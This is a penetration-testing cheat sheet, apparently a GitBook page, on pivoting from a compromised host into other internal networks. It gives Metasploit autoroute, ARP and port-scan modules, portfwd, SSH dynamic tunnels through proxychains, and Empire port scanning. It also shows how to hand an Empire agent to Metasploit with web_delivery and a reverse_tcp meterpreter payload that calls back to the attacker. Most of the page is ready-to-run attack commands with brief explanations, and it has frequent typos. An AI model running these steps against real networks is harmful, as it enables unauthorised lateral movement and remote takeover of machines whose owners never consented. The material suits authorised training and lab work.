# Pivoting

Pivoting is a post exploitation technique that involves utilizing a compromised host to attack other systems on the compromised host's private internal network.

<div data-full-width="false"><figure><img src="../../../.gitbook/assets/image (142).png" alt="" width="375"><figcaption><p>Pivoting Visualize</p></figcaption></figure></div>

## Pivoting with Metasploit

We have two target machine (Victim1 and Victim2), the Victim1 is in the our same subnet but the Victim2 not.

Check the network configuration of the Victim1 for understand what are the two different subnet.&#x20;

```bash
ipconfig
```

Once we got access to the Victim1 we can try to pivoting for scan the Victim2 via meterpreter. (run this command in meterpreter session of Victim1)&#x20;

```bash
# add route
run autoroute -s NETWORK_ID/MASK

# show route
run autoroute -p
```

We can rename the meterpreter sessions.&#x20;

```bash
sessions -n victim-1 -i SESSION
```

To discover ohters host in the pivoting network, we can use a arpscanner module of metasploit.

```bash
# meterpreter
use post/windows/gather/arp_scanner
set RHOSTS IP/MASK
set SESSIONS 
run
```

Use a portscan module to make a scan in the Victim2 (msfconsole)

```bash
use auxialiary/scanner/portscan/tcp
set RHOSTS VICTIM2_IP
run
```

## Portforwarding with Metasploit

When in the victim2 there is a service for exemple HTTP/S (port 80), to access via browser in the our kali machine we have to create a portforwarding. In the Victim1 meterpreter session run this commands:

```bash
portfwd add -l LOCAL_PORTFORWARDING -p VICTIM2_PORT_SERVICE -r VICTIM2_IP
# -l: local port that we want open to host the victim2 service
# -p: victim2 port with the service that we want view
# -r: victim2 IP
```

Now we can scan with db\_nmap the local port.

```bash
db_nmap -sS -sV -p LOCAL_PORTFORWARDING localhost
```

If the expoit dont run for the Victim2 try to change the payload with **bind\_tcp,** and set victim2 IP on the exploit, not "localhost".

***



## SSH Tunneling Pivoting

Once we have access to a machine with SSH credential we can create a tunnel to connect our machine to other networks.

Establish the tunnel on a local port

```bash
ssh -D $LOCAL_PORT $USER@$VICTIM1_IP
# ex ssh -D 8090 mario@192.168.3.2
```

Once we have the tunnel established, we have modify our proxy file and add this port.

```bash
nano /etc/proxychains.conf

# add follow line in the bottom
socks4 127.0.0.1 8090
```

Now using `proxychains` we can access to all port of all other network machines.

```bash
# this command to create a port fordward which allow us to see a web page
proxychains nc -nv $VICTIM2_IP $PORT_TO_FORWARD_ON_VICTIM2

# this command allow us to access via RDP to other machine in other network
proxychains rdesktop $VICTIM2_IP
```



***



## Pivoting PortScan with Empire

we are in a windows machine and we have to run portscanning in other machine via pivoting.

Follow this guide to start empire and connect windows target to it.

{% content-ref url="../../../tools/tools/powershell/powershell-empire-fundamentals.md" %}
[powershell-empire-fundamentals.md](../../../tools/tools/powershell/powershell-empire-fundamentals.md)
{% endcontent-ref %}

Interact with the target with this command:

```bash
interact NAME # get the name from agents empire table
```

Use and set the portscan empire module:

```bash
usemodule powershell/situational_awareness/portscan
set Hosts TARGET2_IP
execute
```

Once the scan will terminated and in the target 2 we can transfer the empire target to msfconsole to do port fordwarding.

## Portforwarding from Empire target

To do portfordwarding in a Empire target we need to use metasploit.

### Transfer Empire target to Metasploit

Use a web delivery to send a command to connect empire to metasploit

```bash
msfconsole
use exploit/multi/script/web_delivery
set target 2 # to select powershell target
set SRVHOST EMPIRE_SERVER_IP
set LHOST ATTACK_MACHINE
set payload windows/meterpreter/reverse_tcp
exploit
```

Copy the URL that the module generate.

Now we go into Empire client (interacting target session), use this module and set the value with URL copied:

```bash
usemodule powershell/code_execution/invoke_metasploitpayload
set URL https://..../.....
```

Then 5 second we can see that in our msfconsole we would have the new session with the target.

### Metasploit Portfordwarding

Use this automatic module that create a route between the network on a target to our local network

```bash
use post/multi/manage/autoroute
set SESSION 1
run
```

Now we utilize a module to host a target port in our system

```bash
use auxiliary/server/socks_proxy
set SRVHOST ATTACK_IP
run
```

Go to firefox settings, search proxy and select SOCKS Host in Manual proxy configuration. Write the Attack machine and the port selected in socks\_proxy msf module (default is 1080)

<figure><img src="../../../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

Now we can connect via firefox searching the TARGET2 IP and hacker it if its vulnerable.

If the expoit dont run for the Victim2 try to change the payload with **bind\_tcp,** and set victim2 IP on the exploit, not "localhost".

***





